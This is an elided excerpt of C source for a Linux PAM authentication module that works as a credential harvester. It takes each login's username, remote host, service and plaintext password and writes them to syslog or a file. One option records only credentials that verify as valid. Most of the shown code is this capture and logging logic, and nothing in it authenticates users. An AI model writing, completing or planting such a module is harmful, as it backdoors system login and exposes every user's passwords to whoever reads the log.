...
static int pam_set_authtok(pam_handle_t *pamh, int flags, int argc,
                           const char **argv, char *prompt, int authtok) {
  int retval;
  ...
  if (retval == PAM_SUCCESS) {
    retval = conversation->conv(1, (const struct pam_message **)pam_msg,
    ...
    if (retval == PAM_SUCCESS) {
      ...
      pam_syslog(LOG_INFO, "conversation returned error: %s",
                 pam_strerror(pamh, retval));
      return retval;
    }
  } else {
    pam_syslog(LOG_INFO, "pam_get_item(conversation) returned error: %s",
               pam_strerror(pamh, retval));
    return retval;
  }
}
...
int conversation_helper_func(int num_msg, const struct pam_message **msg,
...
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc,
  ...
  if (retval != PAM_SUCCESS) {
    pam_syslog(LOG_INFO, "pam_get_item(service) returned error: %s",
               pam_strerror(pamh, retval));
  }

  retval = pam_get_item(pamh, PAM_USER, (void *)&username);
  if (retval != PAM_SUCCESS) {
    pam_syslog(LOG_INFO, "pam_get_item(username) returned error: %s",
               pam_strerror(pamh, retval));
  }

  retval = pam_get_item(pamh, PAM_RHOST, (void *)&host);
  if (retval != PAM_SUCCESS) {
    pam_syslog(LOG_INFO, "pam_get_item(host) returned error: %s",
               pam_strerror(pamh, retval));
  } else {
    if (host == NULL) {
      host = "localhost";
  ...
  if (!password) {
    retval =
        pam_set_authtok(pamh, flags, argc, argv, "Password: ", PAM_AUTHTOK);
    if (retval != PAM_SUCCESS) {
      pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s",
                 pam_strerror(pamh, retval));
    } else {
      retval = pam_get_item(pamh, PAM_AUTHTOK, (void *)&password);
      if (retval != PAM_SUCCESS) {
  ...
  if (log_only_good_credencials == 1) {
    if (verify_credentials(username, password) == 0) {
      if (use_syslog == 1) {
        pam_syslog(LOG_INFO, "host=%s service=%s user=%s pass=%s", host,
  ...
  if (use_syslog == 1) {
    pam_syslog(LOG_INFO, "host=%s service=%s user=%s pass=%s", host, service,
               username, password);
  } else {
    pam_filelog(host, service, username, password);
  }
